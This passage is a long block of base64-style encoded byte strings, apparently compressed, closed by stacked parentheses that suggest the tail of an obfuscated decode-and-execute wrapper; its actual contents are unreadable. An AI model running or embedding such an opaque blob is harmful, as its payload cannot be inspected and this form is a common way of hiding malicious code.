        b'nsD3h6B68wlngbjtnpeiuC/aEdDUysP2tLj/FI2s23gIqNAgDDAG4QnArQXoMKKPbizx8pXDwWi0dxfVnzE+GIZ7L6yBPBZ9ac4HMHwjTnn9vgIaOFP4I0FZOzxxZcdR'
        b'rvpjgBuJu9+ipp3rhBg3OlxTTI8MuCKUxlQcaeSkionwPrUNTe+CFoy5H+cluumU7i5k8ZBPmwytdwSMCXN0LfpbqQyoBgUtp3FEB/zkXJijPYZrmB97+dCgJbXoWlpA'
        b'+NU0nQxz7dnnIaJBcwDL0EZqcediG4DdJD2M4nsR1OYcDdy5cYjak6PhFsaOCxSlm+9H521WlqR5cOM27iviSiea3HCMS7O2U2/GflhNL3o8AOra7g/Eoflgvrk1Gs6j'
        b'bQvs+bqjTWQa97kan8jjJ6FQNiFHSNlOIzW6l5FF44CvTtxhPFQVNrCcE4bQvQ76Uk29F9BpOCwL7t9GdwvhUppCM6BNiFyatmpnUZmG9R4ecU/n5kCTM/SYBgu5zZ0W'
        b'fPK4CbK7zePHrWj5mMiNr2ur8bIET1keYkzzysLkSI879aeaBFDjgTUW7oi6bqJLPLIXMP4YKjEGG5iFHix501wuQtCHhpB7S2KSYDopaXYA1ltKMT6puVr06CT3Z4SF'
        b'pqecAl2d1MFTtMLrDmvwZBBVJVHTcQdTQpxxjW9laCXww2N029A7PvYidwaGrN3Bddt5Ym1aDNe4KEFnZ4FDZQil7/Hj4KJLEEBVoh68131+YiXdSI2G4VyeFHXw1P4Q'
        b'f5h4tSffzXdL5vn1AKRRjGoVokOVOKDDQ81oSznCCMh9B7JsTtoJTvJovT1Mt5l7zsPiamjcDkFQlb4qHORQTpQxblqVzEuHczE8txgcoVadZgz2OgHSOs8bXtXdDPNq'
        b'Ad482coVcdTpeoZmdvkU+oHUoMlJnvpPqo3wdkaiZMoPuM5bN496jVQyNgN1O9CZCQBi4w5x4LFDQgiVxHNJPKUNy3qEvt/fuleHay1PrJVCx1vhv6tB4h9egLTv7jym'
        b'HiGkPW2Ngnq3AroXNIWonIYtIyBuxNZUY8JlR/0F+mOIxkbi1lGfM48c2MLgNIFrhSwz6+me0zoY6F0PajOGaNry4XcGZDQRZQlFb1UK37mGeszdqTiRKreB/3oCDtdF'
        b'2K8BUNSncak6TcjyrsJ1ldJ09G54lSmZgOFVqgWHXWhQy5WEpfEtZnEQ0rwBd6ca86ia3QUfj1xT6nClseBL0Ks++L5ebjHnmYJAHjQQ3iaAG11Mgyu4oOELPgmYus31'
        b'690KqHevdAeP7LOlB14a3F7AD/VSYs2oX18vlxqMuTooFQ2V0J2tqs4hGE8QDYhlTmodkuPtGp7Bo+sBDYOwovb49bzsD/Bqoo5DPp5ChoqbsEtQcEBXPc1opvCNXfDP'
        b'0NAqXxq3UBcDC2bjYgB7fRiSObRapm8cCTd+i3rU6HoalbvzoCPwv+LKWap3i2FhlrxbRFOn9q4BoixQefpmWNqAGd13hJm3wCLGEVe3x6ub7+JFU2o65haUcxDu8wE9'
        b'4BEpLrlGU9ZG7uDkPdTvQ0PKlrCkdlreaGwOOntrC9de4lpBNJXnaFKSs2kvfq3zoO7NkTwPP8mN+rYettzpRs2yKOGtcG7Mg19aKvKjiZM8ttMjgkozC4CNd5xEu6k/'
        b'ocgoMRGCz0zjRbqVSOO54NB1YHC3ILCJPYDWMlt3UP55vpG3JyjFE1BQwTcvOkK+k1piKN+QlsCPMZYtyflFl2kuDF97qDUYYfo9GssJ4NFIuWOc5kWPk17UZAeniRj4'
        b'oCdPB4LBjWkm7wCVa46GcSyrJoKvFa9XDS2UwJCksKJOwY5KoM6CIS3xogOwuBnaOePO02bgu1HcoJHuS8O23Oa7jeok8G9d2kINT710hIyPL6YGBIAMlAZGuFvzvITL'
        b'L2SDZi/xgA9UYJLuqfPj3aqZcDzDYr5/lBc2XqZixH93N/nrah7lxmT5n9dGhNn+qxfpDi0I81o9NB+OTsJS+oUZI3DdPuoPMEFIFb75xDZ07y4PeXDJVURgjyzh5Cpi'
        b'6F4ECNcjR5W0bGczGg/QgOk/RMVbzpBseSbMYEmXu2KpDJRgHO6lZgfXrlFFN/vUHXn0UhpYYHliEV33hF+uoS4JT5qpc9txM38z6MxDO2W9tTy3L4JqdbzVAJsLXHwQ'
        b'fGZYALVdPCpsQnCXb2/XkR2mspNBdm4FGRq8pBd5YTNAHsTc68xhup3DDc5HEVgLVHTKPe0S9KNyM43r7wmCGd83pQUNmok6n7mFH2wEcM1yG5Wd4oUiDS4/cBSmUYbg'
        b'5AFgpw6Biw3k3WTFHVoakhRTrjqRkR4b58KtQTriAya4boTqVKhe3xQm10CzGVqHHLbxjJUwAQrXXUyPLWhW+OvdgOVaBH7Vifs8QeA7d0IW92l0rWMW1QVvgGHUIP7J'
        b'L6SWnRiD8kP8yEMTFH4RzKD9wAVT7ta6oowe1PtTq6H6JdhcPb7V0bJDVvx56rRBWFlq4BZGj8yoXc/VU+scXwvkMss4VR44RvVpULph6FFNeLQwacoDhcKkF8Z9Eeg7'
        b'DidRyr1OXHElzgaOGiToOOp2hKIz1yJ55oITmBn1wVwa4KsrNKMTC0/AJu+R4ExASHt3o2/LlwnBdb0MtPtRLrRl5JwZlGr4Mt+4SpVAcnCPa1EAqNsxhT8DVZJCsA//'
        b'aAfewuzU7Ug4YWBYxj7rcF1broUNRNpexOl289QkdTPuNXezxegu82gqPVQNiMdNZsCR+pR288waWuYB1wxN9KiMuwqExrnkhAfVS6nRDGD++By3BFG3BIf9tCCDt3lw'
        b'Bdh4G+Z0B2NRp2HFPYHA0mEh+yLXX+JlWvQw4srdtOjI3bYhXJUp/K3rkDBdlXwYwinbBEip1JLykMwCHZk+bw0rn98Rlg196zV0xrPVbzfhxg3r7Llt0wHwBZiGL5Rh'
        b'ySiNH2lx614b7tNG4FgWQ6W+PO9Nw+pFQJcG8J+7AOceETR+QYU6LAOoSRMBQt92Xbrvs4NaXIRNSsyOGfODDTtVVLjiiC9XavI138MIihedQLFuuPOEbg4/2qYV5Ezd'
        b'Ltzgs8cbQpmiVimMvhdoX34h3lpPWBA6DxyYpxJrqPqIGMTs6tkd0LaGcCrTlCvFfJyQL/P0JqBBO9/IhtT6Qb9rXT340XaQj4aUNOpxg0YLE/ENfNOUp3YjsKlLpQoV'
        b'6k6zpgdSGvPawzNChM7FRwBh08Hn4NKfuKiAWvdQtR2XboVsxkyo+zI16UMxK9YLf01WvqSyO/UYWr7jocONYA8q5wQOVGq4KwshH6jINWBEHfUbcoufaZHwdsVRCK+V'
        b'Fk6d3UhDjvTYn3rslanFBvyqLYoGTyPmGaEexzgwIHju3Xuyd9JC4OZc7t5IzYHU77D9AE8pw600HbJBZNvBkzvg5AYFI2k5auDnApI97MTLEbaAtqbweJ24y8csoqE7'
        b'FVy8Kxj3aN7guc77sggUs+I0D8bm2CspUgLO0eOj+RjOKkVaQHlSwICd8pmlPWe4R56YVgxR3xEy024ws5coFv0uelNrUFi+MLPkJmzzeSNPMXt1e7NWUAGceo1IJN4u'
        b'4mrtBEWKykEqTYbvvCG8ECMViX2Faxpd5deE8w3VIGhz8TeTZFLrV5s08azjniDYz3wYnsEZZ9KoTjF91hahgdbalIJxiTvuivZn5We2eVsHgf7f/+O0Grfx9VfNgYgu'
        b'XOIqNR6zx2VhIu7etLlQkXMLTXGVJleEKGbX6uASahQdGqVllyBJ3Dezcfx4r71YfkafO3ksSI36AtGYA9rI3adorJwf+ePhyqL+OCOXRY32Yn/51oTyhbAr+xU5a2v3'
        b'X8kclO0W2UsUi4wtFKtnrU0uaXWGHVOkQ7TyUPyYczRR69kpN1GovVIompIvm03/za5/FOd/Juzm+5uuW3e+m/WBt1555K1fLp07+dmBN3dvnJ07+VngP2h9nBxfIkrf'
        b'/prI6/+Y/aPN50/MaxrvbIiuLOxy+/qdr3NTzn2fHX9Rd+oXDa1fvl2s9Vat1tsV1W81V799PfitO8FvV7/zVvs7b1/b+lb91rdvPnxrJTv38THD72T5mlXFNn20bu6r'
        b'K2ovBrfd0claNxj6Y37fSvZhzeRHl08lyV5LPRgTZ/gPPm8m1g/uspdefb6guzM25nW/t3+3I/jU7V+Vdf3qt/885G6br0/93131fiOxeUfSF6WbNl0JO/W3vts+sfjF'
        b'hOmXIqefL31WnnbIQ+Udi5jE6jsvF1QTGz//xHkq58BbTla1JpEnDDwb/QOvXU4fWP/93HJ09KjlwEetdyx/Vld/vNr5J7U/ft158NT37HZ9qJ9S+eXuxvEg83XJLbUO'
        b'FeXe62Q/rqyb2vm9NaWjJ3Y9T/0yomzXM43RJIPnfr+INyn85yPnLhbddHV72nA4/tzEp1YXFjMcg8eeueq0dCes/TjXp27P3IElLfPfFV2PfGP+R0cPJ4aeb//56vTM'
        b'9p/rPA9aSjf7rtUPjiWkFg65dHvofzq4M/vWp58arj1oPF+TMHQrfDn3M7cDw/vaPcOe377wsfFrFr8qUk9pdj/t8oPxEz7bzv0ybF+pz67LH7RcbbP/+J25d12exlO7'
        b'/sy513/h4PYdjX+r6htI6Dykua12/w+fZHwyYG7abt429+Ld5NSi709v3ep8Jj3x0e/fG//h7bzYT65E/dNURMnJ9p53toz+vY7sZ4dTDnR8V7qk/3Zzl2tyhP0B47GJ'
        b'WY1zRrOr18+mx0YYtf/i8t/8089eW+/58o0ViadGyGcTu54lvfbih+Gz+T9Mt/ospcSs5988Uk4oDxeFvLN+uuV989QrpuPitnHlPQX3VT9w1D4bb/pV/LqfvSb+7g3H'
        b'l0f1dJ7/wy83/2jxo4rPbhZ8fCXg/TiNgheRq+8t1Ax/cqr7066tflHvqLm1/NLrctnvMod+93vjz/5w7OWbX/+0NI6/HktsHP3OYnnR6vu/1ptcfqtn7IuSAacnc9c+'
        b'/IMoVvr1e7ZN9hqK/Z+aTiXA0PrpfrAChmo2fLO4c5JGlP/DcgXj/D9ul7wokS+GNOORbd+2+ZPg8uULW7t4SF6Rliz4nmaetro26EGVbl6hFiD0Btz6rERkeQEN3qNi'
        b'+RoJ2xi/P1Y7xzPncrVVcJdObvOW0KiamTyN2pHdPJLPtdvPauUW8qwu3aRqXTVtDR7XPasssteR8kNL6pG/BY3YsZ4G82k251vq0q1vbhAiVaF5GS/I1+Amw99XaL6q'
        b'syde2IJjQGmbKVfKNxu2orE1+T6AyltquXjIfLjKym9pkB+p0JPIgC+FncURkEyf/Za0b857Lb9J+4aYYtQ+/M9fu1X7f6j4q69L/eu+/CxsN2ttbe39X/z7i+9G/+V/'
        b'ipfr1eLiMrMTkuPi8pxURSL5i/NS+Kqvv/7698Wi1eNikbbxqlRV3fR9XYNa56pzzTZVl1ryu5y7Eu7varvw4Ejb1Qnb8bw5m4nCuSMTRVNOr/t9z4ADnjsH/8TMotm5'
        b'OaFlV5t6V+AzM6dx02dmbk89Qp+Zhj4NP/Y04viz8MjnppE/MbHuMmjIeqpnK6R9ihKvaogMjGp96owr9q+qiEw9KzTfM7Z+uiHwmXFghQZ+MdvyrqnrM1PXCq2PbFze'
        b'tfF7ZuP3VM1Kfrz3mc1eHH+lIlHf+1JDT33tCxGKl7aq6ttfiFC8NLBUN3vpoYwjHan6zpdaaupmL0QoXhrpqVt+jsqWq5tE5msqtF9K/cXqli9EQvkyXGmdut0LEYpa'
        b'2ZfCx6qfWKSh91IpW0nd/aXoT+UXilKCk6vyk6vJyjh+T930pdIVCW4o+lP5pbwU6popLpAK31f3q4ksrZ6qmX2kriu/LFVJ3fylSCj/Y1Xh++oxtG32Umm9+t5fi1DI'
        b'z68KX18Gik8oqwtpkr7l49eKj9ULGvIuxKqq274U/an8XF52WX4h/3zVFeFw1VtXfkG4slD1T+ULedmc+YX889UFwuFqhuIO3ipC1T8vX1WU/+CvFSlWt/5CJJQv85T2'
        b'qZv9WoTi5X4lMUQoQvGVilh9w0sVbWG4UKxay1uOU8LgiP5UvmpTOFz1U5ZXiVBR3/pS9OflF4pSUV04XPXW3qwqXT0m3oQyXKw4tkN5/NUvOH6RroIRUloNULPHT1H/'
        b'qdKflS8KVfykakovgtSC1NYqPVUz/yJKT2RgU+HzgfHmWvFPtuyd83m2xWuu4NkWv7/Ts+myeaZn23Xkud7mFxKRid3PjW3+uzrr/2d1LP+rOui9ydrPdfFY/7rqWyAW'
        b'qx8Sv2+wrlfrqaP/c+uDzw0CnmoFKJYad/lYBruJ3nEzDNF8lSZsV95P/qv9X/8/KuQrfL5lCfT/EHvliCsvHL5B+d8Ui14eFYvFesKqu79c/G/SngmD+LpExcdQ9Lqh'
        b'po+VJN3Tdqc4PwBDeOkTa1nt90OVfPTKL/6481aCSopIHN29ac5PW3zrU1AsK7M/lNoMvqGpGvIboyfX/uXTXnFS7+9W/63jDwvD4X9j6Pw926rMvO9tPGT1G6PDAfo/'
        b'suvfs/FOeGnrnSOhI9lHLPrs3hgojopKzB7559jWNWvypqtN8j7c+oN9o/N/n/bF4g8m+lk7pKnNeGT/lu93fh615Z7Lr1YOdO0/G/HGD786c8v3B82nWwuz0je1Rxbc'
        b'PLbrvcMhM9P/YtLylvvT6OPzb/4hQGsotmOpe2RP5i/3Ln8yZDWwR/VA3Nq8yyezX1PXmn5WUimJ+oT8dS+75ex4Qy0poMjt2m1DafNHRqlquTWafg/+3iBy7jtGO1Ie'
        b'JJ1tr1nzk/U+N1U+e+pXftHjI333E1Pp5mffXPzuV3/rZZI00fpZyuY3237fEfOjfzn8+PHomw27jE7//N7HaWFpHyd9/K9x+0KKw94eSLVfp0j1OpbLpUJqorAweU4O'
        b'VVFBsiZNKvEDqlOk743ZzfXnLgeFOfKEUEtYFaPPjyV0X++AfGWdMVduBXu9rUj/K0wjq/Kip0jHQGLF183ki2930x2ek+/3OHQ+RFWkIlVSM+NZeUpd6uGBQq7ahvBX'
        b'd99REfck80N5LhBN6gx04Bo7IaFItVik7koPnJSEzQjK5JQTRLmah16lE+YZO5E0VEzj1OomT/tySfgbobCUx1FR4aK/SIdvSkJ5jIvl6whtryCEFvK2oNNNiqQ0PMvV'
        b'inw3T8Dix/m6hqL1kEN8y/6QkDq5QUILXrykuH8d3+UbQYFbQ3e5iEWqNLqD65VU8rhCkcik9kiMlSzI2QXXBr1Kqmwj2UvT2YqsNAu7eCiZioUKh0IU53V4VLKDxovk'
        b'j3eOavZwlbBX920J3UwVSY+IaTF8vVyYa9cWCqvEQ7YKm6eIpDvE9PAiNytWWt+xc3Zw5FvBYuGNOZH0jJjmXMDChV5lUIPw8hZXBQv3C0HfpaI1vJx8WSosIKBFRfhy'
        b'l6rpepDwTOi5IHenIE17Ja7lJRpXJBbutlfO/w/nL9MjjUNKkPwkLcnz9vj5Ub8mT+ryo3yqTBZe087h6VwEMNoikeUGqaoZjSpWdo/TItXIl5I6CO3h5stpmtSqxN3C'
        b'7ieK3D7lWuavUmKb8oxIkRKbK6j+S2FXDgfu4+IgGrHDKAtJjuWJ38MO0a1toY72KqKD1Bt9QPUS36IOxYg176JHmjyO8GOcphG3cZ2I+2nZRi46A2rUFlZrhAR7HAsD'
        b'Fl0Sc28EN8pT7fANM6oUTjoK+xnlvgrZLHiEywqlVL4fPRcG3V/iCOHfFNKvByuJ1CHWqU1KsIwRC/nyVHqym685BDpuDXF0Eou4SVfLWKJhSf1ywa/lRRrefD4IIxTk'
        b'hBZgTeiCoYuEOx1TFCvlm3Kp1SFg6xYhNQAEH8tdmlyrxKO5tvKYtICHYx2EGSEMzWgQeiv81dx+318jLPqru7j/S45SWFL+F+KX/53L7PmmkEcqb4uESOUPxaIvLEXK'
        b'hu9pG72rbfVM26q96Lm2XbH/e1KNG8ElwU/1bXrd/k669QOp9gdS/Q+kuh9KnZ9JnT+UOuD4m/9NPpQ6/VS68afSLatKKsrGq0oSdfOfatn8WkOkvO6nUhtc+1LlyB7l'
        b'AyDS/+3HV4qP1ZQCsUjLqDjsX788jyO9NV+AzKJRs1UJPn/3j5om+EHZ+D09o5vK+EnZ+Lf5gi2SpoqvhYgtdHwdJGwn9nUS8RaxcOwgEY6dtHw9JewhRqmgY1tWJJmy'
        b'rLwfCjv6KhcU5mTKVqSZ6fkFK9Lk9CSU2TmyrBVJfkHeinLieWHxtDQxOztzRZKeVbCinILYDx95CVmpshXl9KycwoIVSVJa3ookOy95RSUlPbNAhi9nEnJWJBfSc1aU'
        b'E/KT0tNXJGmyIlRB8xrp+elZ+QUJWUmyFZWcwsTM9KQVrQOKRfMhCadxsVZOnqygID3lfFzRmcwVteDspNP+6XhI9USX3bIsIW/ninZ6fnZcQfoZGRo6k7Mi9T/s57+i'
        b'nZOQly+LwykhX8mK/pnsZHdXxX6FccnpqekFK6oJSUmynIL8FW15x+IKshHKZqWuSKJCglc089PSUwriZHl52Xkr2oVZSWkJ6Vmy5DhZUdKKelxcvgyiiotb0cnKjstO'
        b'TCnMT5JvgLui/s0XdKcwS0js+SeiKx+e+P/hP2vrP1NYIeFn/nG5wuIfeJ6uWJypLNC5byu/lJf/a55npeLjJHrdSdPHXfJbtRQMsSwpzWlFLy7u1fGrWP+3Fq++W+ck'
        b'JJ0W0qsK2Q6Ec7LkUHs1+ZLxFdW4uITMzLg4RRfkK8t/J/yukpmdlJCZn/czIQo4K1BY+Wp0+ap5xZSCB8aqMFPmlXcBZ8RCv0NQQMfF4hdKUrF0VUukqV2s+rm0cI/Y'
        b'aDWnEJxE/121Nc/U1jQHvqu2+Zna5qdbvV7fxHbPtwa+p6b3vobJU1OX5xo7n0p3vi/SqzX7kchCfrt/B4Njies='
    ))))
